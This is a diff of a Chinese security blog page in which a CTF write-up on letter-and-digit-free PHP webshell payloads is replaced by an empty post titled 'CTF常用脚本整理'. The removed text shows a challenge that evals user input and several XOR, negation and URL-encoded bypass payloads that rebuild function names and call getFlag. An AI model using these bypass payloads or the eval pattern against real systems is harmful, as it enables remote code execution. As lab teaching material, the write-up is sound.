@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>不包含数字和字母的webshell · Ywc&#39;s blog</title>
+    <title>CTF常用脚本整理 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">不包含数字和字母的webshell</a>
+                <a href="#" class="post-name">CTF常用脚本整理</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            不包含数字和字母的webshell
+            CTF常用脚本整理
             <!-- 404 -->
             
         </h1>
@@ -267,12 +267,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">400</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">0</span> / Reading time: <span class="post-count">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/11/08</span>
+                    <span class="post-intro-time">2018/12/06</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,33 +396,14 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这一串代码描述是这样子，我们要绕过A-Za-z0-9这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符，并且字符串长度小于40。然后再利用 PHP允许动态函数执行的特点，拼接处一个函数名，这里我们是 “getFlag”，然后动态执行之即可。</p>
-<p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到getFlag函数，然后拿到webshell。</p>
-<p><strong>payload one</strong></p>
-<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag
-</code></pre><p>构造一个变量_ 变量的值为_GET 执行$<em>GET[</em>]($_GET[__])</p>
-<p><strong>payload two</strong> </p>
-<pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();
-</code></pre><p>把getFlag取反然后URL编码</p>
-<p><strong>payload three</strong></p>
-<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag
-</code></pre><p>~ 在 {} 中执行了取反操作，所以 ${~”\xa0\xb8\xba\xab”} 取反相当于 $_GET，拼接出了 $_GET<a href="">‘+’</a>;，传入 +=getFlag() 从而执行了函数</p>
-<p><strong>payload four</strong></p>
-<pre><code>?code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();
-</code></pre><p>$啊=getFlag;$啊();，这里就不需要用 {} 了，因为取反的值直接被当作字符串赋值给了 $ 啊。</p>
-<p>当strlen($code)&gt;50时，还可以用</p>
-<pre><code>?code=${&quot;!&quot;^&quot;~&quot;}=&quot;]%];,&lt;&lt;&quot;^&quot;:@)}@][&quot;;${&quot;!&quot;^&quot;~&quot;}();
-</code></pre><p>参考文章：<a href="https://blog.csdn.net/weixin_42815001/article/details/81515427" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42815001/article/details/81515427</a></p>
-<p><a href="http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html#_labelTop" target="_blank" rel="noopener">http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html#_labelTop</a></p>
-
+        
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/11/08/不包含数字和字母的webshell/">https://yinwc.github.io/2018/11/08/不包含数字和字母的webshell/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/11/08/不包含数字和字母的webshell/">November 8th 2018, 10:12:45 am</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2018/12/06/CTF常用脚本整理/">https://yinwc.github.io/2018/12/06/CTF常用脚本整理/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2018/12/06/CTF常用脚本整理/">December 6th 2018, 10:44:05 am</a>
             <p>版权声明: </p>
         </div>
     
@@ -430,17 +411,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/11/10/N1CTF2018题目复现/" title= N1CTF2018题目复现 >
-                    <div class="nextTitle">N1CTF2018题目复现</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/11/08/python沙盒逃逸/" title= python沙箱逃逸 >
-                    <div class="prevTitle">python沙箱逃逸</div>
+                <a href= "/2018/12/03/Git-learn/" title= Git learn >
+                    <div class="prevTitle">Git learn</div>
                 </a>
             
         </li>
@@ -552,7 +528,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li></ol>
+        
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
